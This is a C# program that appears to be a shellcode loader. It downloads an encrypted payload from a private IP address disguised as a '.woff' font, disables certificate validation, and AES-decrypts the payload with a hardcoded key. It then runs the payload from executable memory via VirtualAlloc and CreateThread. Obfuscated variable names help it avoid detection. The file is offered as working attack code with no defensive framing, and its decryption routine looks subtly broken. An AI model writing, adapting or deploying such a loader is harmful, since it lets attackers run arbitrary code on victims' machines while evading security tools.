using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
 
namespace happy
{
    class Program
    {
        private static string dunder = "5eOKBZqYnV23gI2p+iXSgwAgos2mqXvH";
        private static string dunder2 = "GcR/7ObkatXNcru9";
        private static string candid = "http://10.0.2.5:80/test.woff";
 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] beauty = client.DownloadData(candid);
 
            List<byte> l = new List<byte> { };
 
            for (int i = 16; i <= beauty.Length - 1; i++)
            {
                l.Add(beauty[i]);
            }
 
            byte[] actual = l.ToArray();
 
            byte[] tension;
 
            tension = crazy(actual, dunder, dunder2);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)tension.Length, 0x3000, 0x40);
            Marshal.Copy(tension, 0, addr, tension.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
 
        private static byte[] crazy(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);
 
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;
 
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
 
                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }
 
        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }
    }
}
 